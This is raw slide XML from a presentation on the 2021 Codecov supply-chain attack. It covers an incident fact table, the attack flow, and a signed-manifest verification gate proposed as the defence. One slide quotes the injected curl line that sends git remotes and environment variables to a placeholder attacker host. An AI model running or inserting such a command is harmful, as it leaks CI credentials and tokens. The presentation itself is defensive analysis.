          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="4306824"/>
            <a:ext cx="3337560" cy="64008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signing, key management, TLS 1.3, gate, audit log</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Rounded Rectangle 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="5111496"/>
            <a:ext cx="4023360" cy="1078992"/>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Oval 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="5477256"/>
            <a:ext cx="329184" cy="329184"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F3864"/>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300" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="5202936"/>
            <a:ext cx="333756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Validate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="5522976"/>
            <a:ext cx="3337560" cy="64008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attack simulations, 25 automated tests, FAR and timing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The Codecov Incident (2021)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="365760" y="1417320"/>
          <a:ext cx="5577839" cy="4096512"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="0" bandRow="0"/>
              <a:tblGrid>
                <a:gridCol w="1600200"/>
                <a:gridCol w="3977639"/>
              </a:tblGrid>
              <a:tr h="512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Attribute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00" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Documented facts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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Organisation / sector</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Codecov: code-coverage SaaS (DevOps tooling)</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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Component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Bash Uploader (also used by GitHub Action, CircleCI Orb, Bitrise Step)</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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Compromise began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31 January 2021 (periodic alterations)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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Detected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1 April 2021: customer saw checksum mismatch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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Disclosed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15 April 2021</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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Initial access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00" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Docker image build error exposed an HMAC key for a GCS service account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512064">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Impact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00" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>CI env. variables (tokens, keys) + git remotes sent to attacker</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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1417320"/>
            <a:ext cx="260604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172200" y="1527048"/>
            <a:ext cx="2606040" cy="729234"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="B42318"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>~2 months</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="2186330"/>
            <a:ext cx="2459736" cy="530352"/>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undetected in customers' CI</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2880360"/>
            <a:ext cx="260604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6172200" y="2990088"/>
            <a:ext cx="2606040" cy="729234"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="B42318"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>1 line</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="3649370"/>
            <a:ext cx="2459736" cy="530352"/>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of injected code was enough</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rounded Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="4343400"/>
            <a:ext cx="260604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72200" y="4453128"/>
            <a:ext cx="2606040" cy="729234"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>29,000+</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="5112410"/>
            <a:ext cx="2459736" cy="530352"/>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customers reported at the time</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="5852160"/>
            <a:ext cx="8412480" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Sources: Codecov security update [1]; Reuters [2]; HashiCorp HCSEC-2021-12 [3]</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Attack Flow &amp; Problem Statement</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="codecov_attack.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="8412480" cy="1605702"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="3108960"/>
            <a:ext cx="8412480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF7F6"/>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57200" y="3136392"/>
            <a:ext cx="8229600" cy="512064"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1050" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="B42318"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>curl -sm 0.5 -d "$(git remote -v)&lt;&lt;&lt;&lt;&lt;&lt; ENV $(env)" http://&lt;attacker-ip&gt;/upload/v2 || true</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="3840480"/>
            <a:ext cx="4114800" cy="10972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475488" y="3886200"/>
            <a:ext cx="3931920" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Why HTTPS did not help</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="4206240"/>
            <a:ext cx="3931920" cy="73152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TLS authenticates the server and protects bytes in transit. The malicious file was ON the genuine server.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Rounded Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="3840480"/>
            <a:ext cx="4114800" cy="10972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773168" y="3886200"/>
            <a:ext cx="3931920" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Why the checksum did not help</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="4206240"/>
            <a:ext cx="3931920" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Hashing is not authentication. Checking was manual and optional; a checksum beside the file can be swapped too.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rounded Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="5120640"/>
            <a:ext cx="8412480" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E6EFFA"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="9DB8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502920" y="5175504"/>
            <a:ext cx="8183879" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1350" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Problem statement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Automatically prove, before execution, that a vendor artifact is unmodified, signed by a trusted non-revoked key, not an old or revoked version, and built by an approved builder, even if the registry is compromised.</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Vulnerabilities &amp; Security Requirements</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="1705356" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDECEA"/>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B42318"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Integrity (primary)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2180844" y="1371600"/>
            <a:ext cx="1161288" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDECEA"/>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B42318"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Authenticity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3451860" y="1371600"/>
            <a:ext cx="1394460" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDECEA"/>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B42318"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Confidentiality</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4956048" y="1371600"/>
            <a:ext cx="1394460" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4DE"/>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8A5A00"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Non-repudiation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6460236" y="1371600"/>
            <a:ext cx="1627632" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4DE"/>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8A5A00"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Availability (2nd)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="10" name="Table 9"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="365760" y="1965960"/>
          <a:ext cx="8412480" cy="4224528"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="0" bandRow="0"/>
              <a:tblGrid>
                <a:gridCol w="2926080"/>
                <a:gridCol w="2560320"/>
                <a:gridCol w="2926080"/>
              </a:tblGrid>
              <a:tr h="603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Vulnerability (documented incident)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250" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Requirement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250" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Control in our design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603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Credential recoverable from Docker image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Storage access ≠ release authority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Signing service: RBAC + MFA, HSM/KMS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603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>One credential could change a release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Only authorised releases accepted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Ed25519 manifest signature, trusted keys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603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Script ran without verification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Automatic, mandatory verification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Fail-closed CI/CD security gate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603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Checksum not authenticated / optional</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Integrity bound to authenticity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SHA-256 inside signed manifest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603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Script saw every CI secret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Block exfiltration code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250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Security tests + customer content scan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603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>~2 months undetected, no evidence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Tamper-evident accountability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250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Hash-chained audit log + events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Proposed Architecture</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1371600"/>
            <a:ext cx="2788920" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E6EFFA"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="8FB3D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20040" y="1399032"/>
            <a:ext cx="2788920" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>VENDOR  (trusted)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3246120" y="1371600"/>
            <a:ext cx="2331720" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF1F4"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="AAB4BE"/>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3246120" y="1399032"/>
            <a:ext cx="2331720" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
